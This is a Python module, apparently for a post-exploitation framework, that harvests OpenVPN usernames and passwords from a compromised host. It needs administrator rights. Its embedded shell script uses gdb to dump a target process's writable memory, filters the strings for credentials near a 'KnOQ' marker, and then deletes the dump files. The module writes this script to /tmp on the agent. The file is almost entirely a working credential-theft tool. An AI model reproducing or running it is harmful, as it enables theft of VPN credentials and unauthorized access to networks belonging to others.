from lib.common import helpers


class Module:

    def __init__(self, mainMenu, params=[]):

        # metadata info about the module, not modified during runtime
        self.info = {
            # name for the module that will appear in module menus
            'Name': 'Dump OpenVPN credentials from memory',

            # list of one or more authors for the module
            'Author': ['@424f424f'],

            # more verbose multi-line description of the module
            'Description': ('This module will dump openvpn'
                            'credentials from memory.'),

            # True if the module needs to run in the background
            'Background': False,

            # File extension to save the file as
            'OutputExtension': None,

            # if the module needs administrative privileges
            'NeedsAdmin' : True,

            # True if the method doesn't touch disk/is reasonably opsec safe
            'OpsecSafe': False,

            # list of any references/other comments
            'Comments': [
                'https://gist.github.com/rvrsh3ll/cc93a0e05e4f7145c9eb#file-openvpnscraper-sh'
            ]
        }

        # any options needed by the module, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Agent': {
                # The 'Agent' option is the only one that MUST be in a module
                'Description'   :   'Agent to grab a credentials from.',
                'Required'      :   True,
                'Value'         :   ''
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        # During instantiation, any settable option parameters
        #   are passed as an object set to the module and the
        #   options dictionary is automatically set. This is mostly
        #   in case options are passed on the command line
        if params:
            for param in params:
                # parameter format is [Name, Value]
                option, value = param
                if option in self.options:
                    self.options[option]['Value'] = value

    def generate(self):
        openvpndump = """
grep rw-p /proc/$1/maps | sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' | while read start stop; do gdb --batch-silent --silent --pid $1 -ex "dump memory $1-$start-$stop.dump 0x$start 0x$stop"; done
echo "Your credentials should be listed below as username/password"

strings *.dump | grep -B2 KnOQ  | grep -v KnOQ
rm *.dump --force
"""
        script = """
import subprocess
try:
    print "Writing openvpndump.sh to /tmp/"
    cmd1 = \"""echo %s > /tmp/openvpndump.sh""\"
    subprocess.Popen(cmd1, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
except Exception as e:
    print e
""" % (openvpndump)
        return script
